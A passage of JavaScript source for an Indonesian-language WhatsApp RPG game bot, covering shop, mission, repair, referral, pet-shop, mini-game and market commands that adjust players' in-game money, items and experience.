let paymentMethod = Object.keys(listItems[v]).find(v => v in user)
return `➠ 1 ${rpg.emoticon(v)} ${capitalize(v)} ﹫ ${listItems[v][paymentMethod]} ${rpg.emoticon(paymentMethod)}${capitalize(paymentMethod)}`.trim()
}).join('\n')}
–––––––––––––––––––––––––
💁🏻‍♂ ᴛɪᴩ :
➠ ᴛᴏ ʙᴜʏ ɪᴛᴇᴍs:
${command} [item] [quantity]
▧ ᴇxᴀᴍᴩʟᴇ:
${command} potion 10
`.trim()) : 
(`
🛒 List Items :
${Object.keys(listItems).map((v) => {
let paymentMethod = Object.keys(listItems[v]).find(v => v in user)
return `➠ 1 ${rpg.emoticon(v)} ${capitalize(v)} ﹫ ${listItems[v][paymentMethod]} ${rpg.emoticon(paymentMethod)}${capitalize(paymentMethod)}`.trim()
}).join('\n')}
–––––––––––––––––––––––––
💁🏻‍♂ ᴛɪᴩ :
➠ ᴛᴏ sᴇʟʟ ɪᴛᴇᴍs:
${command} [item] [quantity]
▧ ᴇxᴀᴍᴩʟᴇ:
${command} potion 10
`.trim())
)

const total = Math.floor(isNumber(args[1]) ? Math.min(Math.max(parseInt(args[1]), 1), Number.MAX_SAFE_INTEGER) : 1) * 1
if (!listItems[item]) return qioreply(footer)
if (command.toLowerCase() == 'buy') {
let paymentMethod = Object.keys(listItems[item]).find(v => v in user)
if (user[paymentMethod] < listItems[item][paymentMethod] * total) return m.reply(`Kamu membutuhkan *${(listItems[item][paymentMethod] * total) - user[paymentMethod]}* ${capitalize(paymentMethod)} ${rpg.emoticon(paymentMethod)} Lagi, Untuk Membeli *${total}* ${capitalize(item)} ${rpg.emoticon(item)}. Kamu hanya memiliki *${user[paymentMethod]}* ${capitalize(paymentMethod)} ${rpg.emoticon(paymentMethod)}.`)
user[paymentMethod] -= listItems[item][paymentMethod] * total
user[item] += total
return m.reply(`Sukses Membeli *${total} ${capitalize(item)} ${rpg.emoticon(item)}*, Seharga *${listItems[item][paymentMethod] * total} ${capitalize(paymentMethod)} ${rpg.emoticon(paymentMethod)}*`)
} else {
let paymentMethot = Object.keys(listItems[item]).find(v => v in user)
if (user[item] < total) return m.reply(`You don't have enough *${capitalize(item)} ${rpg.emoticon(item)}* to sell, you only have ${user[item]} items`)
user[item] -= total
user[paymentMethot] += listItems[item][paymentMethot] * total
return m.reply(`Sukses Menjual *${total} ${capitalize(item)} ${rpg.emoticon(item)}*, Seharga *${listItems[item][paymentMethot] * total} ${capitalize(paymentMethot)} ${rpg.emoticon(paymentMethot)}*`)
}
}
break
//=================================================//
case 'selectskill': {
if (!isGroup) return qioreply(mess.ingroup)
let user = db.data.users[m.sender]
let skill = ["swordmaster", "necromancer", "witch", "Archer", "magicswordmaster", "thief", "shadow"]
let bintang = {
"satu": "⭐",
"dua": "⭐⭐",
"tiga": "⭐⭐⭐",
"empat": "⭐⭐⭐⭐",
"lima": "⭐⭐⭐⭐⭐",
"Enam": "⭐⭐⭐⭐⭐⭐"
}
 let skil = text.trim().toLowerCase() // to filter text
 if (!skill.includes(skil)) return qioreply( `Select *skill🃏* what do you want/pilih skill apa yg kamu inginkan:

${skill.map(skil => `› ${skil}`).join('\n')}

How To use/Cara menggunakan:
${command} <nameskill>
 
Example/Contoh:
${command} necromancer
`)
if (user.skill == "") {
user.skill = skil
m.reply(`Anda telah memilih Skill ${skil}`)
} else if (user.skill) {
m.reply(`Anda Sudah Punya skill ${user.skill} Tidak bisa diganti`)
}
}
break
//=================================================//
case 'sampah': {
if (!isGroup) return qioreply(mess.ingroup)
const rewards = {
exp: 500,
money: 20999,
}

const cooldown = 2592000000
let user = db.data.users[m.sender]
if (new Date - user.lastmonthly < cooldown) return qioreply( `You have already claimed this monthly claim, wait for *${((user.lastmonthly + cooldown) - new Date()).toTimeString()}*`.trim())
let text = ''
for (let reward of Object.keys(rewards)) if (reward in user) {
user[reward] += rewards[reward]
text += `*+${rewards[reward]}* ${rpg.emoticon(reward)}${reward}\n`
}
qioreply('*––––––『 NYAMPAH 』––––––*\n' + text.trim())
user.lastmonthly = new Date * 1
}
break
//=================================================//
case 'roket': {
if (!isGroup) return qioreply(mess.ingroup)
function clockString(ms) {
let h = Math.floor(ms / 3600000)
let m = Math.floor(ms / 60000) % 60
let s = Math.floor(ms / 1000) % 60
return [h, m, s].map(v => v.toString().padStart(2, 0)).join(':')
}
let __timers = (new Date - db.data.users[m.sender].lastmisi)
let _timers = (3600000 - __timers)
let user = db.data.users[m.sender]
let order = db.data.users[m.sender].rokets
let timers = clockString(_timers)
let name = user.registered ? user.name: qio.getName(m.sender)
let id = m.sender
let kerja = 'Roket'
qio.misi = qio.misi ? qio.misi: {}
if (id in qio.misi) {
qioreply( `Selesaikan Misi ${qio.misi[id][0]} Terlebih Dahulu`)
throw false
}
if (user.health < 80) return m.reply(`Anda Harus Memiliki Minimal 80Health`)
if (new Date - db.data.users[m.sender].lastmisi > 3600000) {
let ngerok4 = Math.floor(Math.random() * 10)
let ngerok5 = Math.floor(Math.random() * 10)

let ngrk4 = (ngerok4 * 100000)
let ngrk5 = (ngerok5 * 1000)

let rokit = `🌕


▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▄▄▄▒▒▒█▒▒▒▒▄▒▒▒▒▒▒▒▒
▒█▀█▀█▒█▀█▒▒█▀█▒▄███▄▒
░█▀█▀█░█▀██░█▀█░█▄█▄█░
░█▀█▀█░█▀████▀█░█▄█▄█░
████████▀█████████████
🚀

👨‍🚀 Memulai penerbangan....
`.trim()

let rokit2 = `🌕


🚀
▒▒▄▄▄▒▒▒█▒▒▒▒▄▒▒▒▒▒▒▒▒
▒█▀█▀█▒█▀█▒▒█▀█▒▄███▄▒
░█▀█▀█░█▀██░█▀█░█▄█▄█░
░█▀█▀█░█▀████▀█░█▄█▄█░
████████▀█████████████

➕ Dalam penerbangan....
`.trim()

let rokit3 = `🌕🚀


▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▄▄▄▒▒▒█▒▒▒▒▄▒▒▒▒▒▒▒▒
▒█▀█▀█▒█▀█▒▒█▀█▒▄███▄▒
░█▀█▀█░█▀██░█▀█░█▄█▄█░
░█▀█▀█░█▀████▀█░█▄█▄█░
████████▀█████████████

➕ Sampai di tujuan....
`.trim()

let rokit4 = `🌕🚀

➕ Sukses Mendarat.... 👨‍🚀
`.trim()

let hsl = `
*—[ Hasil Ngroket ${name} ]—*
➕ 💹 Uang = [ ${ngrk4} ]
➕ ✨ Exp = [ ${ngrk5} ]
➕ 😍 Mendarat Selesai = +1
➕📥Total Mendarat Sebelumnya : ${order}
`.trim()

user.money += ngrk4
user.exp += ngrk5
user.rokets += 1
user.health -= 80

qio.misi[id] = [
kerja,
setTimeout(() => {
delete qio.misi[id]
}, 27000)
]

setTimeout(() => {
qioreply( hsl)
}, 27000)

setTimeout(() => {
qioreply( rokit4)
}, 25000)

setTimeout(() => {
qioreply( rokit3)
}, 20000)

setTimeout(() => {
qioreply( rokit2)
}, 15000)

setTimeout(() => {
qioreply( rokit)
}, 10000)

setTimeout(() => {
qioreply( `🔍 ${name} Mencari Lokasi.....`)
}, 0)
user.lastmisi = new Date * 1
} else m.reply(`Silahkan Menunggu Selama ${timers}, Untuk Menyelesaikan Misi Kembali`)
}
break
//=================================================//
case 'rob':
case 'robery': {
if (!isGroup) return qioreply(mess.ingroup)
function clockString(ms) {
let h = Math.floor(ms / 3600000)
let m = Math.floor(ms / 60000) % 60
let s = Math.floor(ms / 1000) % 60
return [h, m, s].map(v => v.toString().padStart(2, 0)).join(':')
}
let user = db.data.users[m.sender]
let __timers = (new Date - user.lastmisi)
let _timers = (3600000 - __timers)
let timers = clockString(_timers)
let id = m.sender
let kerja = 'Rob'
qio.misi = qio.misi ? qio.misi : {}
if (id in qio.misi) {
qioreply( `Selesaikan Misi ${qio.misi[id][0]} Terlebih Dahulu`)
throw false
}
if (user.health < 80) return qioreply('Anda Harus Memiliki Minimal 80Health')
if (new Date - db.data.users[m.sender].lastmisi > 3600000) {
let rndm1 = Math.floor(Math.random() * 10)
let rndm2 = Math.floor(Math.random() * 10)

let ran1 = (rndm1 * 100000)
let ran2 = (rndm2 * 1000)

let jln = `
🏘️🚗

✔️ Mengincar target....
`.trim()

let jln2 = `
🏘️ 🚶

➕ Memulai aksi....
`.trim()

let jln3 = `
🏘️

➕ Merampok....
`.trim()

let jln4 = `
🚗



🏘️🚓

➕ 💹Berhasil kabur....
`.trim()

let hsl = `
*—[ Hasil rob ]—*

➕ 💹 Uang = [ ${ran1} ]
➕ ✨ Exp = [ ${ran2} ]
➕ 📦 Rob Selesai = +1

Dan health anda berkurang -80
`.trim()
user.money += ran1
user.exp += ran2
user.health -= 80

qio.misi[id] = [
kerja,
setTimeout(() => {
delete qio.misi[id]
}, 27000)
]

setTimeout(() => {
qioreply(hsl)
}, 27000)

setTimeout(() => {
qioreply(jln4)
}, 25000)

setTimeout(() => {
qioreply(jln3)
}, 20000)

setTimeout(() => {
qioreply(jln2)
}, 15000)

setTimeout(() => {
qioreply(jln)
}, 10000)

setTimeout(() => {
qioreply('🔍Mencari Rumah.....')
}, 0)
user.lastmisi = new Date * 1
} else m.reply(`Silahkan Menunggu Selama ${timers}, Untuk Menyelesaikan Misi Kembali`)
}
break
//=================================================//
case 'repair': {
if (!isGroup) return qioreply(mess.ingroup)
const {default: MessageType } = require ('@whiskeysockets/baileys')

let type = (args[0] || '').toLowerCase()
let _type = (args[0] || '').toLowerCase()
let user = db.data.users[m.sender]
db.data.users[m.sender].pickaxe = db.data.users[m.sender].pickaxe || 0
db.data.users[m.sender].sword = db.data.users[m.sender].sword || 0
db.data.users[m.sender].fishingrod = db.data.users[m.sender].fishingrod || 0
db.data.users[m.sender].armor = db.data.users[m.sender].armor || 0
let botol = global.botwm

let lgocraft = `
*「 R E P A I R」*`

let caption = `
▧ .repaire pickaxe ⛏️
▧ .repair sword ⚔️
▧ .repair fishingrod 🎣
▧ .repair armor 🥼

*❏ RECIPE*
▧ Pickaxe ⛏️
〉20 Rock
〉 20 Wood
〉 20 Iron
〉 1 Diamond

▧ Sword ⚔️
〉 20 Wood
〉 20 Iron
〉 2 Gold
〉 1 Diamond

▧ FishingRod ⚔️
〉 20 Wood
〉 20 String
〉 20 Iron
〉 1 Diamond

▧ Armor 🥼
〉 15 Iron
〉 2 Gold
〉 1 Diamond
`

try {
if (/repair/i.test(command)) {
const count = args[1] && args[1].length > 0 ? Math.min(99999999, Math.max(parseInt(args[1]), 1)) : !args[1] || args.length < 3 ? 1 : Math.min(1, count)
switch (type) {
case 'pickaxe':
if (user.pickaxedurability > 99) return qioreply('Tools ini belum memiliki kerusakan')
if (user.pickaxe == 0) return qioreply('Kamu belum memilik ini')
if(user.diamond < 1 || user.rock < 20 || user.wood < 20 || user.iron < 20 ) return m.reply(`Barang tidak cukup!`)
 user.rock -= 20
 user.wood -= 20
 user.iron -= 20
 user.diamond -= 1
 user.pickaxedurability = 100
qioreply("Sukses memperbaiki!")
break
//=================================================//
case 'sword':
if (user.sworddurability > 99) return qioreply('Tools ini belum memiliki kerusakan')
if (user.sword == 0) return qioreply('Kamu belum memilik ini')
if(user.diamond < 1 || user.wood < 20 || user.iron < 20 || user.gold < 2 ) return m.reply(`Barang tidak cukup!`)
 user.wood -= 20
 user.iron -= 20
 user.gold -= 3
 user.diamond -= 1
 user.sworddurability = 100
qioreply("Sukses memperbaiki!")
break
//=================================================//
case 'fishingrod':
if (user.fishingroddurability > 99) return qioreply('Tools ini belum memiliki kerusakan')
if (user.fishingrod == 0) return qioreply('Kamu belum memiliki ini')
if(user.diamond < 1 || user.string < 20 || user.wood < 20 || user.iron < 20 ) return m.reply(`Barang tidak cukup!`)
 user.wood -= 20
 user.string -= 20
 user.iron -= 20
 user.diamond -= 1
 user.fishingroddurability = 100
qioreply("Sukses memperbaiki!")
break
//=================================================//
case 'armor':
if (user.armordurability > 99) return qioreply('Tools ini belum memiliki kerusakan')
if (user.armor == 0) return qioreply('Kamu belum memilik ini')
if(user.diamond < 1 || user.iron < 15 || user.gold < 2 ) return m.reply(`Barang tidak cukup!`)
 user.iron -= 15
 user.gold -= 2
 user.diamond -= 1
 user.armordurability = 100
qioreply("Sukses memperbaiki!")
break
default:
return await qioreply(caption)
}
} else if (/enchant|enchan/i.test(command)) {
const count = args[2] && args[2].length > 0 ? Math.min(99999999, Math.max(parseInt(args[2]), 1)) : !args[2] || args.length < 4 ? 1 :Math.min(1, count)
switch (_type) {
case 't':
break
//=================================================//
case '':
break

default:
return qio.sendButton( m.chat, caption, wm, null, [`⋮☰ Menu`, `.menu`], m)
}
}
} catch (err) {
qioreply("Error\n\n\n" + err.stack)
}
}
break
//=================================================//
case 'referal': {
if (!isGroup) return qioreply(mess.ingroup)
const { crypto } = require ("crypto")
const xp_first_time = 2500
const xp_link_creator = 15000
const xp_bonus = {
5: 40000,
 10: 100000,
 20: 250000,
 50: 1000000,
100: 10000000,
}

let users = db.data.users
if (text) {
if ('ref_count' in users[m.sender]) throw 'Tidak bisa menggunakan kode referal!'
let link_creator = (Object.entries(users).find(([, { ref_code }]) => ref_code === text.trim()) || [])[0]
if (!link_creator) throw 'Kode referal tidak valid'
let count = users[link_creator].ref_count++
let extra = xp_bonus[count] || 0
users[link_creator].exp += xp_link_creator + extra
users[m.sender].exp += xp_first_time
users[m.sender].ref_count = 0
m.reply(`
Selamat!
+${xp_first_time} XP
`.trim())
m.reply(`
Seseorang telah menggunakan kode referal kamu
+${xp_link_creator + extra} XP
`.trim(), link_creator)
} else {
let code = users[m.sender].ref_code = users[m.sender].ref_code || new Array(11).fill().map(() => [...'0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'][crypto.randomInt(62)]).join('')
users[m.sender].ref_count = users[m.sender].ref_count ? users[m.sender].ref_count : 0
let command_text = `${command}ref ${code}`
let command_link = `wa.me/${qiouser.jid.split('@')[0]}?text=${encodeURIComponent(command_text)}`
let share_text = `
Dapatkan ${xp_first_time} XP untuk yang menggunakan link/kode referal dibawah ini

Referal Code: *${code}*

${command_link}
`.trim()
m.reply(`
Dapatkan ${xp_link_creator} XP untuk setiap pengguna baru yang menggunakan kode referal kamu
${users[m.sender].ref_count} orang telah menggunakan kode referal kamu

Kode referal kamu: ${code}

Bagikan link kepada teman: ${command_link}

atau kirim pesan kepada teman wa.me/?text=${encodeURIComponent(share_text)}

${Object.entries(xp_bonus).map(([count, xp]) => `${count} Orang = Bonus ${xp} XP`).join('\n')}
`.trim())
}
}
break
//=================================================//
case 'petstore': 
case 'petshop': {
if (!isGroup) return qioreply(mess.ingroup)
let type = (args[0] || '').toLowerCase()
let _type = (args[0] || '').toLowerCase()
let user = db.data.users[m.sender]
db.data.users[m.sender].pickaxe = db.data.users[m.sender].pickaxe || 0
db.data.users[m.sender].pedang = db.data.users[m.sender].pedang || 0
db.data.users[m.sender].fishingrod = db.data.users[m.sender].fishingrod || 0

//----------HARGA
let hdog = 2
let hcat = 2
let hhorse = 4
let hfox = 6
let hrobo = 10

let hlion = 10
let hrhinoceros = 10
let hdragon = 10
let hcentaur = 10
let hkyubi = 10
let hgriffin = 10
let hphonix = 10
let hwolf = 10

let logo = `— *P E T S T O R E* —
▮▧▧▧▧▧▧▧▧▧▧▧▧▮`
let caption = `
🐈 *Cat:* ${hcat} 🔖
🐕 *Dog:* ${hdog} 🔖
🐎 *Horse:* ${hhorse} 🔖
🦊 *Fox:* ${hfox} 🔖
🤖 *Robo:* ${hrobo} 🔖

〉 Ingin Beli? Check out:
.petshop cat
.petshop fox
.petshop dog
and more! 🐾
`

try {
if (/petshop/i.test(command)) {
const count = args[1] && args[1].length > 0 ? Math.min(99999999, Math.max(parseInt(args[1]), 1)) : !args[1] || args.length < 3 ? 1 : Math.min(1, count)
switch (type) {
case 'cat':
if (user.cat > 0) return qioreply('Kamu sudah memilik ini')
if(user.pet < hcat) return m.reply(`Pet Token anda kurang`)
db.data.users[m.sender].pet -= hcat
db.data.users[m.sender].cat += 1
qioreply("Selamat anda mempunyai pet Baru ! 🎉")
break
//=================================================//
case 'dog':
if (user.dog > 0) return qioreply('Kamu sudah memilik ini')
if(user.pet < hdog) return m.reply(`Pet Token anda kurang`)
db.data.users[m.sender].pet -= hdog
db.data.users[m.sender].dog += 1
qioreply("Selamat anda mempunyai pet Baru ! 🎉")
break
//=================================================//
case 'fox':
if (user.fox > 0) return qioreply('Kamu sudah memilik ini')
if(user.pet < hfox) return m.reply(`Pet Token anda kurang`)
db.data.users[m.sender].pet -= hfox
db.data.users[m.sender].fox += 1
qioreply("Selamat anda mempunyai pet Baru ! 🎉")
break
//=================================================//
case 'horse':
if (user.horse > 0) return qioreply('Kamu sudah memilik ini')
if(user.pet < hhorse) return m.reply(`Pet Token anda kurang`)
db.data.users[m.sender].pet -= hhorse
db.data.users[m.sender].horse += 1
qioreply("Selamat anda mempunyai pet Baru ! 🎉")
break
//=================================================//
case 'robo':
if (user.robo > 0) return qioreply('Kamu sudah memilik ini')
if(user.pet < hrobo) return m.reply(`Pet Token anda kurang`)
db.data.users[m.sender].pet -= hrobo
db.data.users[m.sender].robo += 1
qioreply("Selamat anda mempunyai pet Baru ! 🎉")
break
//=================================================//
case 'lion':
if (user.lion > 0) return qioreply('Kamu sudah memilik ini')
if(user.pet < hlion) return m.reply(`Pet Token anda kurang`)
db.data.users[m.sender].pet -= hlion
db.data.users[m.sender].lion += 1
qioreply("Selamat anda mempunyai pet Baru ! 🎉")
break
//=================================================//
case 'rhinoceros':
if (user.rhinoceros > 0) return qioreply('Kamu sudah memilik ini')
if(user.pet < hrhinoceros) return m.reply(`Pet Token anda kurang`)
db.data.users[m.sender].pet -= hrhinoceros
db.data.users[m.sender].rhinoceros += 1
qioreply("Selamat anda mempunyai pet Baru ! 🎉")
break
//=================================================//
case 'dragon':
if (user.dragon > 0) return qioreply('Kamu sudah memilik ini')
if(user.pet < hdragon) return m.reply(`Pet Token anda kurang`)
db.data.users[m.sender].pet -= hdragon
db.data.users[m.sender].dragon += 1
qioreply("Selamat anda mempunyai pet Baru ! 🎉")
break
//=================================================//
case 'centaur':
if (user.centaur > 0) return qioreply('Kamu sudah memilik ini')
if(user.pet < hcentaur) return m.reply(`Pet Token anda kurang`)
db.data.users[m.sender].pet -= hcentaur
db.data.users[m.sender].centaur += 1
qioreply("Selamat anda mempunyai pet Baru ! 🎉")
break
//=================================================//
case 'kyubi':
if (user.kyubi > 0) return qioreply('Kamu sudah memilik ini')
if(user.pet < hkyubi) return m.reply(`Pet Token anda kurang`)
db.data.users[m.sender].pet -= hkyubi
db.data.users[m.sender].kyubi += 1
qioreply("Selamat anda mempunyai pet Baru ! 🎉")
break
//=================================================//
case 'griffin':
if (user.griffin > 0) return qioreply('Kamu sudah memilik ini')
if(user.pet < hgriffin) return m.reply(`Pet Token anda kurang`)
db.data.users[m.sender].pet -= hgriffin
db.data.users[m.sender].griffin += 1
qioreply("Selamat anda mempunyai pet Baru ! 🎉")
break
//=================================================//
case 'phonix':
if (user.phonix > 0) return qioreply('Kamu sudah memilik ini')
if(user.pet < hphonix) return m.reply(`Pet Token anda kurang`)
db.data.users[m.sender].pet -= hphonix
db.data.users[m.sender].phonix += 1
qioreply("Selamat anda mempunyai pet Baru ! 🎉")
break
//=================================================//
case 'wolf':
if (user.wolf > 0) return qioreply('Kamu sudah memilik ini')
if(user.pet < hwolf) return m.reply(`Pet Token anda kurang`)
db.data.users[m.sender].pet -= hwolf
db.data.users[m.sender].wolf += 1
qioreply("Selamat anda mempunyai pet Baru ! 🎉")
break

default:
return await m.reply(`${logo}\n${caption}`)
}
} else if (/enchant|enchan/i.test(command)) {
const count = args[2] && args[2].length > 0 ? Math.min(99999999, Math.max(parseInt(args[2]), 1)) : !args[2] || args.length < 4 ? 1 :Math.min(1, count)
switch (_type) {
case 't':
break
//=================================================//
case '':
break

default:
return m.reply(`${logo}\n${caption}`)
}
}
} catch (err) {
qioreply("Error\n\n\n" + err.stack)
}
}
break
//=================================================//
case 'kolam': {
if (!isGroup) return qioreply(mess.ingroup)
let user = db.data.users[m.sender]
let past = `
╭━━━━「 *BIO* 」 
┊ *💌 Name :* ${user.registered ? user.name : qio.getName(m.sender)}
┊ *📊 Level :* ${user.level}
┊ *✨ Exp :* ${user.exp}
╰═┅═━––––––─ׄ✧

╭━━━━「 *ISI* 」
┊🦀 Kepiting: ${user.kepiting}
┊🦞 Lobster: ${user.lobster}
┊🦐 Udang: ${user.udang}
┊🦑 Cumi: ${user.cumi}
┊🐙 Gurita: ${user.gurita}
┊🐡 Buntal: ${user.buntal}
┊🐠 Dory: ${user.dory}
┊🐳 Orca: ${user.orca}
┊🐬 Lumba: ${user.lumba}
┊🐋 Paus: ${user.paus}
┊🦈 Hiu: ${user.hiu}
╰═┅═━––––––─ׄ✧
🎏 Total Isi: *${user.kepiting + user.lobster + user.udang + user.cumi + user.gurita + user.buntal + user.dory + user.orca + user.lumba + user.paus + user.hiu}* Jenis`
qioreply(past)
}
break
//=================================================//
case 'koboy': {
if (!isGroup) return qioreply(mess.ingroup)
function random(arr) {
return arr[Math.floor(Math.random() * arr.length)]
}
try {
qio.tembak = qio.tembak || { musuh: [], tembak: [] }
 if(/kiri/i.test(text)) {

let kiri = [
["🤠", "-", "-", "-", "-"],
["-", "🤠", "-", "-", "-"],
["-", "-", "🤠", "-", "-"],
["-", "-", "-", "🤠", "-"],
["-", "-", "-", "-", "🤠"]
]

if(qio.tembak.tembak.indexOf("🤠") == 0) {
qio.tembak.tembak = kiri[0]
} else if(qio.tembak.tembak.indexOf("🤠") == 1) {
qio.tembak.tembak = kiri[0]
} else if(qio.tembak.tembak.indexOf("🤠") == 2) {
qio.tembak.tembak = kiri[1]
} else if(qio.tembak.tembak.indexOf("🤠") == 3) {
qio.tembak.tembak = kiri[2]
} else if(qio.tembak.tembak.indexOf("🤠") == 4) {
qio.tembak.tembak = kiri[3]
}

let pos = qio.tembak.musuh.join(" ") + "\n\n\n" + qio.tembak.tembak.join(" ")



if(qio.tembak.musuh.indexOf("🥷") === qio.tembak.tembak.indexOf("🤠")) return qio.sendButton(m.chat, pos, wm, [
['Tembak', `${command}koboy tembak`] 
])
return qio.sendButton(m.chat, pos, wm, [
['←', `${command}koboy kiri`], ['→', `${command}koboy kanan`]
])
} else if(/kanan/i.test(text)) {

let kanan = [
["🤠", "-", "-", "-", "-"],
["-", "🤠", "-", "-", "-"],
["-", "-", "🤠", "-", "-"],
["-", "-", "-", "🤠", "-"],
["-", "-", "-", "-", "🤠"]
]

if(qio.tembak.tembak.indexOf("🤠") == 0) {
qio.tembak.tembak = kanan[1]
} else if(qio.tembak.tembak.indexOf("🤠") == 1) {
qio.tembak.tembak = kanan[2]
} else if(qio.tembak.tembak.indexOf("🤠") == 2) {
qio.tembak.tembak = kanan[3]
} else if(qio.tembak.tembak.indexOf("🤠") == 3) {
qio.tembak.tembak = kanan[4]
} else if(qio.tembak.tembak.indexOf("🤠") == 4) {
qio.tembak.tembak = kanan[4]
}

let pos = qio.tembak.musuh.join(" ") + "\n\n\n" + qio.tembak.tembak.join(" ")



if(qio.tembak.musuh.indexOf("🥷") === qio.tembak.tembak.indexOf("🤠")) return qio.sendButton(m.chat, pos, wm, [
['Tembak', `${command}koboy tembak`] 
]) 
return qio.sendButton(m.chat, pos, wm, [
['←', `${command}koboy kiri`], ['→', `${command}koboy kanan`]
])
} else if(/tembak/i.test(text)) {

if(qio.tembak.tembak.indexOf("🤠") == qio.tembak.musuh.indexOf("🥷")) {
qio.tembak = {}
db.data.users[m.sender].money += 1000
qioreply("Kamu menang!\n\nUang += 1000")
}

} else {
 let randMusuh = [
["🥷", "-", "-", "-", "-"],
["-", "🥷", "-", "-", "-"],
["-", "-", "🥷", "-", "-"],
["-", "-", "-", "🥷", "-"],
["-", "-", "-", "-", "🥷"]
]
 let randAku = [
["🤠", "-", "-", "-", "-"],
["-", "🤠", "-", "-", "-"],
["-", "-", "🤠", "-", "-"],
["-", "-", "-", "🤠", "-"],
["-", "-", "-", "-", "🤠"]
]

let musuh = random(randMusuh)
 let aku = random(randAku)

qio.tembak.musuh = musuh
qio.tembak.tembak = aku

let pos = qio.tembak.musuh.join(" ") + "\n\n\n" + qio.tembak.tembak.join(" ")

if(qio.tembak.musuh.indexOf("🥷") === qio.tembak.tembak.indexOf("🤠")) return qio.sendButton(m.chat, pos, wm, [
['Tembak', `${command}koboy tembak`] 
])
return qio.sendButton(m.chat, pos, wm, [
['←', `${command}koboy kiri`], ['→', `${command}koboy kanan`]
])
}
} catch (e) {
throw false
}
}
break
//=================================================//
case 'pasar': {
if (!isGroup) return qioreply(mess.ingroup)
const Skepiting = 7000
const Slobster = 7000
const Sudang = 7000
const Scumi = 7000
const Sgurita = 7000
const Sbuntal = 7000
const Sdory = 7000
const Sorca = 7000
const Slumba = 7000
const Spaus = 7000
const Sikan = 7000
const Shiu = 7000
const Sbanteng = 9000
const Sharimau = 9000
const Sgajah = 9000
const Skambing = 9000
const Spanda = 9000
const Sbuaya = 9000
const Skerbau = 9000
const Ssapi= 9000
const Smonyet = 9000
const Sbabihutan = 9000
const Sbabi = 9000
const Sayam = 9000
const Sbotol = 100
const Skardus = 100
const Skaleng = 100
const Sgelas = 100
const Splastik = 100

const _armor = db.data.users[m.sender].armor
const armor = (_armor == 0 ? 20000 : '' || _armor == 1 ? 49999 : '' || _armor == 2 ? 99999 : '' || _armor == 3 ? 149999 : '' || _armor == 4 ? 299999 : '')
let type = (args[0] || '').toLowerCase()
let _type = (args[1] || '').toLowerCase()
let jualbeli = (args[0] || '').toLowerCase()
const Kchat = `╍╌╌╍╌╌╍╌╌╍╌╌┅═━––––––๑
*🛒 Hewan Laut | 💲 Harga Jual*\n═┅═━––––––━––––––๑
🦀 Kepiting: ${Skepiting}
🦞 Lobster: ${Slobster}
🦐 Udang: ${Sudang}
🦑 Cumi: ${Scumi}
🐙 Gurita: ${Sgurita}
🐡 Buntal: ${Sbuntal}
🐠 Dory: ${Sdory}
🐳 Orca: ${Sorca}
🐬 Lumba: ${Slumba}
🐋 Paus: ${Spaus}
🦈 Hiu: ${Shiu}
╍╌╌╍╌╌╍╌╌╍╌╌┅═━––––––๑
*🛒 Hewan Darat | 💲 Harga Jual*\n═┅═━––––––━––––––๑
🐃 Banteng: ${Sbanteng}
🐅 Harimau: ${Sharimau}
🐘 Gajah: ${Sgajah}
🐐 Kambing: ${Skambing}
🐼 Panda: ${Spanda}
🐃 Kerbau: ${Skerbau}
🐊 Buaya: ${Sbuaya}
🐂 Sapi: ${Ssapi}
🐒 Monyet: ${Smonyet}
🐗 Babi Hutan: ${Sbabihutan}
🐖 Babi: ${Sbabi}
🐔 Ayam: ${Sayam}
╍╌╌╍╌╌╍╌╌╍╌╌┅═━––––––๑
📌 *Contoh penggunaan :*\n═┅═━––––––━––––––๑
#pasar jual ayam [Jumlah]
`.trim()
try {
if (/pasar|toko/i.test(command)) {
const count = args[2] && args[2].length > 0 ? Math.min(99999999, Math.max(parseInt(args[2]), 1)) : !args[2] || args.length < 4 ? 1 :Math.min(1, count)
const sampah = db.data.users[m.sender].sampah
switch (jualbeli) {

case 'jual': 
switch (_type) {
 case 'banteng':
if (db.data.users[m.sender].banteng >= count * 1) {
db.data.users[m.sender].money += Spaus * count
db.data.users[m.sender].banteng -= count * 1
qioreply( `Sukses Menjual ${count} Banteng Dengan Harga ${Sbanteng * count} Money `.trim())
} else qioreply( `Banteng Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'harimau':
if (db.data.users[m.sender].harimau >= count * 1) {
db.data.users[m.sender].money += Sharimau * count
db.data.users[m.sender].harimau -= count * 1
qioreply( `Sukses Menjual ${count} Harimau Dengan Harga ${Sharimau * count} Money `.trim())
} else qioreply( `Harimau Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'gajah':
if (db.data.users[m.sender].gajah >= count * 1) {
db.data.users[m.sender].money += Sgajah * count
db.data.users[m.sender].gajah -= count * 1
qioreply( `Sukses Menjual ${count} Gajah Dengan Harga ${Sgajah * count} Money `.trim())
} else qioreply( `Gajah Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'kambing':
if (db.data.users[m.sender].kambing >= count * 1) {
db.data.users[m.sender].money += Skambing * count
db.data.users[m.sender].kambing -= count * 1
qioreply( `Sukses Menjual ${count} Kambing Dengan Harga ${Skambing * count} Money `.trim())
} else qioreply( `Kambing Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'panda':
if (db.data.users[m.sender].panda >= count * 1) {
db.data.users[m.sender].money += Spanda * count
db.data.users[m.sender].panda -= count * 1
qioreply( `Sukses Menjual ${count} Panda Dengan Harga ${Sbuaya * count} Money `.trim())
} else qioreply( `Panda Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'buaya':
if (db.data.users[m.sender].buaya >= count * 1) {
db.data.users[m.sender].money += Sbuaya * count
db.data.users[m.sender].buaya -= count * 1
qioreply( `Sukses Menjual ${count} Buaya Dengan Harga ${Sbuaya * count} Money `.trim())
} else qioreply( `Buaya Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'kerbau':
if (db.data.users[m.sender].kerbau >= count * 1) {
db.data.users[m.sender].money += Skerbau * count
db.data.users[m.sender].kerbau -= count * 1
qioreply( `Sukses Menjual ${count} Kerbau Dengan Harga ${Skerbau * count} Money `.trim())
} else qioreply( `Kerbau Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'sapi':
if (db.data.users[m.sender].sapi >= count * 1) {
db.data.users[m.sender].money += Ssapi * count
db.data.users[m.sender].sapi -= count * 1
